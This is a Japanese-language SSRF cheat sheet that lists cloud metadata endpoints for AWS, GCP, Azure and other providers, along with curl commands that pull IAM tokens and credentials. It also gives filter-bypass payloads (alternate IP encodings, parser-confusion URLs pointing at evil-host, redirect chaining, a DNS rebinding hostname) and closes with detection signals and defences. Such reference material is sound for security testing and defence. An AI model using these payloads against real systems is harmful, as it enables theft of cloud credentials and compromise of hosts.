## SSRFクラウドメタデータURLチートシート

SSRF（Server-Side Request Forgery、サーバーサイドリクエストフォージェリ）は、攻撃者が指定したURLをサーバー自身に代わりに取得させることで、本来アクセスできないはずの内部リソースへ到達させる脆弱性である。クラウド環境ではこの内部リソースの中でも特に危険なのが「インスタンスメタデータサービス（IMDS: Instance Metadata Service）」である。IMDSは各クラウドプロバイダがVM/コンテナに対して、リンクローカルアドレス（`169.254.169.254`など、ルーティングされずインスタンス自身からしか到達できない特殊なIPレンジ）経由で提供する内部APIで、インスタンスの設定情報に加えて、そのインスタンスに割り当てられたIAMロール（クラウド上のリソースにアクセスするための権限セット）の**一時クレデンシャル**を平文で返す。SSRFでこのエンドポイントに到達できれば、攻撃者はサーバーのミドルウェアやアプリケーションコードを一切経由せずに、クラウドAPIを直接叩ける認証情報を丸ごと窃取できる。本節は、主要クラウド各社のメタデータURLと、そこに到達するための前提条件（必要ヘッダー、トークン取得手順など）を一覧化したチートシートである。

### なぜメタデータサービスが「刺さる」のか（仕組み）

IMDSの設計思想は「同一ホスト上のプロセスからしか到達できないアドレスに機微情報を置けば安全」というものである。`169.254.0.0/16`はRFC 3927で定義されたリンクローカルアドレス空間で、ルータを越えて転送されない。つまり本来は「サーバー自身のプロセス」だけがこのアドレスに到達できる想定だった。

しかしSSRF脆弱性が存在すると、この前提が崩れる。アプリケーションが「URLを受け取ってそこにリクエストを送る」処理（画像のプレビュー取得、Webhook配信、外部APIへのプロキシ、PDF生成時のURL埋め込みなど）を持っていて、かつ送信先URLの検証が不十分な場合、攻撃者は`url=http://169.254.169.254/...`のような入力を渡すだけで、**サーバー自身に**このリクエストを代行させられる。リクエストの送信元はサーバー自身のネットワークインターフェースなので、リンクローカルアドレスへの到達制限は無意味になる。これがクラウド環境でSSRFが「即クレデンシャル窃取」に直結する理由である。

### AWS EC2 — IMDSv1 / IMDSv2

AWSのEC2インスタンスメタデータサービスには2つのバージョンが存在する。

**IMDSv1（トークン不要、旧方式）**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

`iam/security-credentials`にロール名なしでGETすると、そのインスタンスにアタッチされているIAMロール名の一覧が返る。続けてロール名を付けてGETすると、`AccessKeyId`・`SecretAccessKey`・`SessionToken`・`Expiration`を含むJSONが返る。これはIAMロールがEC2に一時的に発行するSTS（Security Token Service）クレデンシャルそのものであり、これをAWS CLIやSDKの環境変数に設定すれば、そのIAMロールが持つ全権限（S3バケット読み書き、他のEC2操作、場合によってはアカウント全体の管理者権限）をそのまま行使できる。

IMDSv1はGETリクエスト一発で機微情報が取れてしまうため、単純なSSRF（レスポンスがそのままアプリの画面に表示される、いわゆる非ブラインドSSRF）はもちろん、URLをフェッチさせるだけのブラインドSSRF（リクエストは飛ぶがレスポンス内容は見えないタイプ）でも、外部にデータを持ち出す工夫（Out-of-Band経由の外部送信を組み込んだサーバーサイドコードへの2次攻撃など）と組み合わせて悪用されてきた。

**IMDSv2（トークン必須、2019年導入・現在の推奨方式）**

IMDSv2はAWSがSSRF対策として導入した方式で、GETの前に**PUTリクエストでセッショントークンを取得**することを必須にする。

```bash
# 手順1: トークン取得（PUTメソッド + TTLヘッダーが必要）
curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token"

# 手順2: 取得したトークンをヘッダーに付けてGET
curl -H "X-aws-ec2-metadata-token: <取得したトークン>" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

これがなぜ防御になるかというと、多くのSSRFの悪用経路は「アプリが受け取ったURLに対してGETリクエストを送る」だけの単純なプロキシ挙動であり、**HTTPメソッドの指定や任意ヘッダーの付与**までは攻撃者が制御できないケースが多いからである。PUTメソッドを要求することで、GETしか発行しない典型的なSSRF実装（画像取得、Webhookなど）を無力化できる。

ただし万能ではない。攻撃者がSSRFの対象となるアプリで**HTTPメソッドとカスタムヘッダーを自由に指定できる**場合（プロキシ機能やWebhook検証機能が任意のヘッダー転送を許してしまう実装など）は、IMDSv2でもトークン取得からフルに悪用できる。2025年に報告されたTypebot.ioのWebhook機能の脆弱性（GHSA-8gq9-rw7v-3jpr）はまさにこのパターンで、カスタムヘッダー注入によりIMDSv2トークンを取得し、EKS（AWSのKubernetesサービス）のクレデンシターを窃取された。したがってIMDSv2は「多くの単純なSSRFを防ぐ緩和策」であって「SSRF自体を無害化する対策」ではないと理解する必要がある。

IPv6環境ではリンクローカルアドレスに加えて次のエンドポイントも存在する。

```
http://[fd00:ec2::254]/latest/meta-data/
```

またWAF（Web Application Firewall）による`169.254.169.254`という文字列のブラックリスト検出を回避するため、IPアドレスの別表記が使われることがある。

```
http://2852039166/                  # 10進数表記
http://0xA9FEA9FE/                  # 16進数表記
http://0251.0376.0251.0376/         # 8進数表記
```

これらはOSやライブラリの`inet_aton`系関数がRFC準拠外の表記（先頭ゼロを8進数として解釈する、4オクテットではなく単一の32bit整数として解釈するなど）を許容してしまうことを悪用したものである。パーサ（文字列を構造化データへ変換する処理）ごとに許容範囲が異なるため、単純な文字列マッチによるフィルタは容易にすり抜けられる。

**ECS（Elastic Container Service）タスクメタデータ**

コンテナ環境ではエンドポイントが異なる。

```
http://169.254.170.2/v2/credentials/<UUID>
```

このUUIDはコンテナ内の環境変数`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`または`/proc/self/environ`から取得できる。SSRFに加えてファイル読み取り（LFI）やSSRF経由の`/proc/self/environ`アクセスができれば、このUUIDを取り出してタスクロールのクレデンシャルを窃取できる。

**Lambda Runtime API**

```
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

Lambda環境でSSRFが起きると、実行中の関数呼び出しイベント自体を横取りできる可能性がある。

> 出典: PayloadsAllTheThings — SSRF-Cloud-Instances.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md（GitHub Pages版: https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances/）

### Google Cloud Platform（GCP）

GCPのメタデータサービスはAWSと異なり、**特定ヘッダーの付与を必須**にすることでSSRF対策を図っている。

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
```

必須ヘッダーはいずれか一方でよい。

```
Metadata-Flavor: Google
```

または

```
X-Google-Metadata-Request: True
```

```bash
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

主要な取得対象パスは以下の通り。

```
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

ヘッダー必須という設計は、AWS IMDSv2のPUTメソッド要求と同じ狙いを持つ——単純なURLフェッチ型SSRFでは任意ヘッダーを付けられないことが多いため、これだけで多くの悪用経路を塞げる。しかし、この防御には歴史的な抜け穴があった。**`v1beta1`という旧APIバージョン**は、ヘッダーなしでもアクセスできる（すでに非推奨だが後方互換のため長らく残っていた）。

```
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
```

`kube-env`はGKE（Google Kubernetes Engine）のノードに残る設定情報で、クラスタ証明書やkubeletの認証情報を含むことがある。防御側の対策としては、GCPコンソールやAPI経由でこの`v1beta1`レガシーエンドポイントを無効化する設定が有効である。

> 出典: PayloadsAllTheThings — SSRF-Cloud-Instances.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md

### Microsoft Azure

AzureのIMDSも必須ヘッダー方式を採用している。

```
Metadata: true
```

```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

より新しいバージョンでは、Managed Identity（Azureが自動的にリソースへ紐づける認証用のIDで、パスワード管理なしでAzure ADトークンを取得できる仕組み）用のトークンエンドポイントも重要な標的になる。

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

`Metadata: true`ヘッダーはブラウザのXHR/Fetchでは付与できないカスタムヘッダーであり、CSRF経由の悪用を防ぐ意味合いもあるが、サーバーサイドのSSRFでヘッダー制御が可能な場合は依然として突破される。

> 出典: Vulnsy SSRF Cheat Sheet — https://www.vulnsy.com/cheat-sheets/ssrf

### その他の主要クラウド・オンプレ基盤

以下は認証ヘッダー不要、またはシンプルな構成のため、SSRFが成立すればほぼ即座に情報漏洩に至るプロバイダ群である。

**DigitalOcean**（ヘッダー不要）

```
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
http://169.254.169.254/metadata/v1.json    # 全項目を一括取得
```

**Oracle Cloud Infrastructure（OCI）**

旧世代エンドポイント（ヘッダー不要）:

```
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

現行のv2エンドポイントは`Bearer Oracle`という固定のAuthorizationヘッダーを要求する設計に変わっている。

```
http://169.254.169.254/opc/v2/instance/
```

Authorizationヘッダー: `Bearer Oracle`

**Alibaba Cloud**（ヘッダー不要）

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

**Hetzner Cloud**（ヘッダー不要）

```
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
```

**OpenStack / HP Helion**

```
http://169.254.169.254/openstack
http://169.254.169.254/2009-04-04/meta-data/
```

**コンテナ・オーケストレーション層（SSRFがLFIやRCEに直結しやすい）**

```
# Kubernetes etcd（認証なしで公開されていることがある）
http://127.0.0.1:2379/v2/keys/?recursive=true

# Docker Engine API（Unixソケットではなくtcp:2375で公開されている場合）
http://127.0.0.1:2375/v1.24/containers/json
http://127.0.0.1:2375/v1.24/images/json
curl --unix-socket /var/run/docker.sock http://foo/containers/json
```

Docker APIやKubernetes etcdはクラウドメタデータではないが、SSRFの到達先としてしばしば同列に語られる。これらが認証なしでリッスンしていると、コンテナの起動・停止、新規コンテナの作成（ホストのファイルシステムをマウントしたコンテナを起動すればホストへのRCEに直結）が可能になるため、クラウドクレデンシャル窃取と並ぶ重大な到達点である。

> 出典: PayloadsAllTheThings — SSRF-Cloud-Instances.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md

### メタデータIPへの到達を妨げるフィルタのバイパス

多くのアプリケーションは「`169.254.169.254`という文字列を含むURLを拒否する」「プライベートIPレンジへのリクエストを拒否する」といった素朴なブロックリスト方式の対策を実装している。しかしURL文字列の解釈はパーサ（ブラウザ、HTTPクライアントライブラリ、正規表現による検証コードなど）ごとに揺れがあり、これを突くバイパス手法が数多く存在する。

**IPアドレスの別表記によるバイパス**

```
http://[::ffff:169.254.169.254]/        # IPv4射影IPv6アドレス
http://0251.0376.0251.0376/             # 8進数
http://0xA9FEA9FE/                      # 16進数（32bit整数の16進表記）
http://2852039166/                      # 10進数（32bit整数表記）
http://169.254.169.254.nip.io/          # 任意サブドメインを指定IPに解決するDNSサービス
```

これらが機能する原理は、多くの言語のURLパーサ・IP検証関数が「厳密なドット区切り4オクテット10進数」以外の表記（32bit整数一発、8進数プレフィックスの`0`、16進数プレフィックスの`0x`など）も内部的には有効なIPアドレスとして解釈してしまうことにある。文字列レベルで`169.254.169.254`をブロックリストに入れるだけの実装は、この別表記を素通りさせる。

**パーサ混同（URLの構成要素解釈の不一致）を突くバイパス**

```
http://expected-host:fake@evil-host/
http://evil-host#expected-host
http://expected-host.evil-host/
```

これはOrange Tsaiが提唱した「A New Era of SSRF」の研究で知られる手法で、URLの「検証に使われるパーサ」と「実際にリクエストを送るHTTPクライアントのパーサ」が異なるライブラリ・異なる実装だった場合、両者が「どこがホスト名か」の解釈で食い違うことを突く。例えば検証ロジックは`@`より前をユーザー情報として無視し`expected-host`をホストとみなすが、実際にリクエストを発行するクライアントは`@`より後ろの`evil-host`に接続する、といった食い違いが起こり得る。

**オープンリダイレクトの連鎖**

```
?url=https://allowed.example.com/redirect?to=http://169.254.169.254/latest/meta-data/
```

送信先ドメインをホワイトリスト検証するだけで、**リダイレクト先までは検証しない**実装に対する攻撃である。最初のリクエストは許可ドメインへ向くため検証を通過するが、307/308などのHTTPリダイレクトレスポンスによって最終的な接続先がメタデータIPへ誘導される。検証時と実際のフェッチ時で別々のHTTPクライアント呼び出しが行われる実装や、リダイレクトを自動追従する設定になっているHTTPクライアントで特に危険である。

**DNSリバインディング**

```
http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/
```

これは「検証時のDNS解決」と「実際に接続する際のDNS解決」を分離し、TTL（DNSキャッシュの有効期限）を極端に短く設定することで、1回目の名前解決では許可された公開IPを返し、2回目（実際の接続時）の名前解決では内部IP（メタデータIP）を返す攻撃である。多くの「URLを検証してから接続する」実装は、検証と接続の間に時間差があり、かつ両方が別個にDNS解決を行うため、この時間差を突かれる。防御としては、**1回だけ名前解決してそのIPに対して直接ソケットを張り、Hostヘッダーだけ元のホスト名を使う「DNSピン留め」**が有効とされる。2026年にCraft CMSで報告されたCVE-2026-27127も、まさにこのDNSリバインディングによるメタデータブロックリスト回避の事例である。

> 出典: PayloadsAllTheThings — SSRF README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md ／ Vulnsy SSRF Cheat Sheet — https://www.vulnsy.com/cheat-sheets/ssrf

### 検出シグナル（防御側・診断側の視点）

自組織のアプリケーションにSSRFが存在するかを調査する際、レスポンスや挙動に現れる以下のシグナルが手がかりになる。

- **クラウドクレデンシャルの漏洩シグナル**: レスポンスボディに`AccessKeyId`、`SecretAccessKey`、`Token`、`Expiration`（AWS）、`aliases`、`service-accounts/`（GCP）、`compute.vmId`や`network.interface[].ipv4.ipAddress.privateIpAddress`（Azure）といったキーが含まれていないか。
- **ブラインドSSRFの兆候**: レスポンスは変化しないが、外部から観測可能なDNSクエリだけが発生する（Out-of-Band Application Security Testing、通称OASTサービスを使って検知する）。
- **ポートスキャン的挙動の兆候**: 内部の開いているポートと閉じているポートでレスポンス時間や振る舞いに差が出る（開いているポートは即座に接続確立、閉じているポートはTCPタイムアウトまで待たされるなど）。

### 防御策のまとめ

- **IMDSv2の強制**: AWSであれば以下のようにIMDSv1を無効化し、トークン必須・ホップ数制限を設定する。

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-0123456789abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

`--http-put-response-hop-limit 1`は、メタデータへのリクエストがコンテナ経由などでさらに転送されるホップ数を1に制限し、リバースプロキシ越しの間接アクセスを難しくする設定である。

- **ネットワーク層でのブロック**: 出口プロキシやVPCのルーティングテーブルレベルで、アプリケーションサーバーから`169.254.169.254`および`RFC1918`（プライベートIP全域）への直接到達を遮断し、必要な場合のみ専用プロキシ経由でアクセスさせる。
- **許可リスト方式への転換**: 「ユーザーが完全なURLを直接指定できる」設計自体を避け、あらかじめ登録済みのID・キーからサーバー側が内部で持つ固定URLへマッピングする方式に変更する。

```javascript
// 危険な実装：ユーザーが完全なURLを直接指定できる
const { url } = await request.json();
const body = await fetch(url).then((r) => r.text());

// 安全な実装：登録済みIDから内部マップを参照するだけ
const FEEDS = {
  press: "https://press.example.com/rss.xml",
  support: "https://support.example.com/feed.xml",
};
const { feed } = await request.json();
const target = FEEDS[feed];
if (!target) throw new Error("unknown feed");
const body = await fetch(target).then((r) => r.text());
```

この対策が本質的に強い理由は、攻撃者が制御できる入力（`feed`という識別子）が、最終的にリクエスト先URLへ直接反映されない点にある。バイパス手法の多くはURL文字列の解釈揺れを突くものなので、そもそも「攻撃者が入力したURLをリクエストの宛先に使わない」設計であれば、パーサ混同やエンコーディングによるバイパスの対象そのものが存在しなくなる。

- **IAMロールの最小権限化**: 万一クレデンシャルが窃取されても被害を限定できるよう、インスタンスにアタッチするIAMロールの権限は必要最小限にとどめ、可能であればメタデータへのアクセス自体を専用のプロキシサービスアカウントに限定する。
- **DNSピン留め**: URLの検証と実際の接続を同一のIPに対して行い、検証後にDNSが再解決されないようにする。

### 実世界の事例（2024〜2026年）

| CVE / 識別子 | 年 | 概要 |
|---|---|---|
| GHSA-8gq9-rw7v-3jpr（Typebot.io） | 2025 | Webhook機能でのカスタムヘッダー注入によりIMDSv2トークンを取得し、EKSクレデンシャルを窃取 |
| CVE-2026-27127（Craft CMS） | 2026 | DNSリバインディングによりメタデータIPに対するブロックリストを回避 |
| CVE-2024-34351（Next.js Server Actions） | 2024 | Hostヘッダー操作により内部サービスへアクセス可能 |
| CVE-2025-57822（Next.js resolve-routes） | 2025 | ユーザー制御ヘッダーによるルート解決経由のSSRF |

これらの事例が示すように、IMDSv2やヘッダー必須方式といった対策が普及した2020年代後半でも、「アプリケーションがヘッダーやメソッドを自由に転送してしまう機能（Webhook、プロキシ機能など）」が存在する限り、SSRFからのクレデンシャル窃取は依然として現実的な脅威であり続けている。診断・防御の双方において、単一の対策に頼らず、ネットワーク層の遮断・許可リスト方式・最小権限化を多層的に組み合わせることが重要である。

> 出典: Vulnsy SSRF Cheat Sheet — https://www.vulnsy.com/cheat-sheets/ssrf
